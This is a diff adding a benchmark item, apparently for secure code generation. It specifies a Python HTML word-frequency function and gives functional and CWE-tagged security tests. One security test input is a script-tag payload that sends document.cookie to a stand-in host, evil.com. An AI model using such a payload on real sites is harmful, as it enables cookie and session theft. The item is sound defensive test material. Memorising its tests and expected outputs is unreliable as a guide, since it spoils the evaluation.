@@ -1,0 +1,317 @@
+{
+  "benchmark_id": 287,
+  "prompt": "Write a function named parse_words that accepts three parameters: html_content (a string containing raw HTML markup), stop_words (a list of lowercase strings representing words to exclude from the result), and dictionary_words (a list of strings representing all valid dictionary words). The function must first validate all inputs: if html_content is null or not a string, if stop_words is null or not a list, or if dictionary_words is null or not a list, the function must return the string 'Error: Invalid input'. The function must internally convert stop_words and dictionary_words to sets for efficient lookup. The function must then parse the HTML content by removing all HTML tags and extracting all sequences of alphabetic characters, converting each extracted word to lowercase. For each extracted word, if the word is not in stop_words and is present in dictionary_words, add it to a result set of unique words and increment its count in a frequency dictionary. The function must return a dictionary with exactly two keys: 'words' mapped to a sorted list of unique valid non-stop words found, and 'frequencies' mapped to a dictionary where each key is a word string and each value is the integer count of how many times that word appeared in the HTML content. If html_content is an empty string or contains no extractable alphabetic words, the function must return {'words': [], 'frequencies': {}}.",
+  "implementation_details": "Language: Python. Use the html.parser module from the standard library (HTMLParser) to strip HTML tags \u2014 do not use pickle, subprocess, or any deserialization library. Before any processing, explicitly validate inputs using isinstance() checks: stop_words must be an instance of list, dictionary_words must be an instance of list, and html_content must be an instance of str. Extract words using re.findall(r'[a-zA-Z]+', text) on the plain text content after stripping tags. Convert stop_words and dictionary_words to sets internally using set() before performing membership checks. Convert all extracted words to lowercase before comparison. Return 'words' as a sorted list of unique strings and 'frequencies' as a plain dict with string keys and integer values.",
+  "fc_tests": [
+    {
+      "test_id": 0,
+      "input": {
+        "html_content": "<p>The cat sat on the mat</p>",
+        "stop_words": [
+          "the",
+          "on"
+        ],
+        "dictionary_words": [
+          "cat",
+          "sat",
+          "mat"
+        ]
+      },
+      "expected_output": {
+        "words": [
+          "cat",
+          "mat",
+          "sat"
+        ],
+        "frequencies": {
+          "cat": 1,
+          "mat": 1,
+          "sat": 1
+        }
+      }
+    },
+    {
+      "test_id": 1,
+      "input": {
+        "html_content": "<p>the the the</p>",
+        "stop_words": [
+          "the"
+        ],
+        "dictionary_words": [
+          "cat"
+        ]
+      },
+      "expected_output": {
+        "words": [],
+        "frequencies": {}
+      }
+    },
+    {
+      "test_id": 2,
+      "input": {
+        "html_content": "<p>cat cat dog</p>",
+        "stop_words": [],
+        "dictionary_words": [
+          "cat",
+          "dog"
+        ]
+      },
+      "expected_output": {
+        "words": [
+          "cat",
+          "dog"
+        ],
+        "frequencies": {
+          "cat": 2,
+          "dog": 1
+        }
+      }
+    },
+    {
+      "test_id": 3,
+      "input": {
+        "html_content": "<p></p>",
+        "stop_words": [
+          "the"
+        ],
+        "dictionary_words": [
+          "cat"
+        ]
+      },
+      "expected_output": {
+        "words": [],
+        "frequencies": {}
+      }
+    },
+    {
+      "test_id": 4,
+      "input": {
+        "html_content": "",
+        "stop_words": [
+          "the"
+        ],
+        "dictionary_words": [
+          "cat"
+        ]
+      },
+      "expected_output": {
+        "words": [],
+        "frequencies": {}
+      }
+    },
+    {
+      "test_id": 5,
+      "input": {
+        "html_content": "<p>Cat CAT cat</p>",
+        "stop_words": [],
+        "dictionary_words": [
+          "cat"
+        ]
+      },
+      "expected_output": {
+        "words": [
+          "cat"
+        ],
+        "frequencies": {
+          "cat": 3
+        }
+      }
+    },
+    {
+      "test_id": 6,
+      "input": {
+        "html_content": "<p>hello123 world</p>",
+        "stop_words": [],
+        "dictionary_words": [
+          "hello",
+          "world"
+        ]
+      },
+      "expected_output": {
+        "words": [
+          "hello",
+          "world"
+        ],
+        "frequencies": {
+          "hello": 1,
+          "world": 1
+        }
+      }
+    },
+    {
+      "test_id": 7,
+      "input": {
+        "html_content": "<p>foo bar</p>",
+        "stop_words": [],
+        "dictionary_words": [
+          "cat"
+        ]
+      },
+      "expected_output": {
+        "words": [],
+        "frequencies": {}
+      }
+    },
+    {
+      "test_id": 8,
+      "input": {
+        "html_content": "<h1>Apple</h1><p>apple pie</p>",
+        "stop_words": [],
+        "dictionary_words": [
+          "apple",
+          "pie"
+        ]
+      },
+      "expected_output": {
+        "words": [
+          "apple",
+          "pie"
+        ],
+        "frequencies": {
+          "apple": 2,
+          "pie": 1
+        }
+      }
+    },
+    {
+      "test_id": 9,
+      "input": {
+        "html_content": "<p>cat dog bird</p>",
+        "stop_words": [
+          "dog"
+        ],
+        "dictionary_words": [
+          "cat",
+          "dog",
+          "bird"
+        ]
+      },
+      "expected_output": {
+        "words": [
+          "bird",
+          "cat"
+        ],
+        "frequencies": {
+          "bird": 1,
+          "cat": 1
+        }
+      }
+    },
+    {
+      "test_id": 10,
+      "input": {
+        "html_content": null,
+        "stop_words": [],
+        "dictionary_words": [
+          "cat"
+        ]
+      },
+      "expected_output": "Error: Invalid input"
+    },
+    {
+      "test_id": 11,
+      "input": {
+        "html_content": "<p>cat</p>",
+        "stop_words": null,
+        "dictionary_words": [
+          "cat"
+        ]
+      },
+      "expected_output": "Error: Invalid input"
+    },
+    {
+      "test_id": 12,
+      "input": {
+        "html_content": "<p>cat</p>",
+        "stop_words": [],
+        "dictionary_words": null
+      },
+      "expected_output": "Error: Invalid input"
+    },
+    {
+      "test_id": 13,
+      "input": {
+        "html_content": "<p>cat</p>",
+        "stop_words": "the",
+        "dictionary_words": [
+          "cat"
+        ]
+      },
+      "expected_output": "Error: Invalid input"
+    }
+  ],
+  "sec_tests": [
+    {
+      "test_id": 0,
+      "input": {
+        "html_content": "<script>fetch('http://evil.com?data='+document.cookie)</script><p>hello world</p>",
+        "stop_words": [],
+        "dictionary_words": [
+          "hello",
+          "world"
+        ]
+      },
+      "expected_behavior/output": "The function must strip all HTML tags including script tags before extracting words. Script tag content must never be executed or evaluated. Only plain alphabetic words from visible text content must be extracted. The returned 'words' list must contain only 'hello' and 'world' in sorted order.",
+      "CWE": "CWE-79"
+    },
+    {
+      "test_id": 1,
+      "input": {
+        "html_content": null,
+        "stop_words": [],
+        "dictionary_words": [
+          "hello"
+        ]
+      },
+      "expected_behavior/output": "A null html_content must be caught by the isinstance() check before any parsing is attempted. The function must return the string 'Error: Invalid input' without raising an unhandled exception.",
+      "CWE": "CWE-20"
+    },
+    {
+      "test_id": 2,
+      "input": {
+        "html_content": "<p>hello</p>",
+        "stop_words": null,
+        "dictionary_words": [
+          "hello"
+        ]
+      },
+      "expected_behavior/output": "A null stop_words must be caught by the isinstance() check before any membership check is performed. The function must return the string 'Error: Invalid input' without raising an unhandled exception.",
+      "CWE": "CWE-20"
+    },
+    {
+      "test_id": 3,
+      "input": {
+        "html_content": "<p>hello</p>",
+        "stop_words": [],
+        "dictionary_words": null
+      },
+      "expected_behavior/output": "A null dictionary_words must be caught by the isinstance() check before any membership check is performed. The function must return the string 'Error: Invalid input' without raising an unhandled exception.",
+      "CWE": "CWE-20"
+    },
+    {
+      "test_id": 4,
+      "input": {
+        "html_content": "<p>hello</p>",
+        "stop_words": "the",
+        "dictionary_words": [
+          "hello"
+        ]
+      },
+      "expected_behavior/output": "A string passed as stop_words must be rejected by the isinstance(stop_words, list) check before any processing begins. Without this explicit check, Python would silently perform substring membership testing on the string rather than word-level lookup. The function must return the string 'Error: Invalid input'.",
+      "CWE": "CWE-20"
+    },
+    {
+      "test_id": 5,
+      "input": {
+        "html_content": "Aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+        "stop_words": [],
+        "dictionary_words": [
+          "aaaaaaaaaa"
+        ]
+      },
+      "expected_behavior/output": "The function must handle extremely large HTML input without unbounded memory allocation or excessive processing time. It must complete within a reasonable time and return a result without crashing or exhausting system resources.",
+      "CWE": "CWE-400"
+    }
+  ],
+  "source_repo": "DayGitH/Python-Challenges"
+}
